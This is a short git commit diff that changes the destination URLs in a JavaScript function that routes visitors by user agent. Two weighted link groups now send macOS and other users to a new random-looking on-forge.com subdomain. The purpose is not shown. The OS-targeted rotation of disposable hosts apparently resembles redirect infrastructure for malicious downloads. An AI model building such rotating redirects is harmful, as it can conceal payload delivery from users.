2a5f9d70d28175fafe45beb9088dec82056da5d8
animalinside <akshay.anand12@yahoo.com>
2026-05-04 11:41:12 +0530

    Update URLs for macOS and others in linkGroups

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://kajfwuhgrvruge.on-forge.com/",
-            others: "https://kajfwuhgrvruge.on-forge.com/"
+            macos: "https://dsnkjsdhgdugvds.on-forge.com/",
+            others: "https://dsnkjsdhgdugvds.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://kajfwuhgrvruge.on-forge.com/",
-            others: "https://kajfwuhgrvruge.on-forge.com/"
+            macos: "https://dsnkjsdhgdugvds.on-forge.com/",
+            others: "https://dsnkjsdhgdugvds.on-forge.com/"
         }
     ];
 
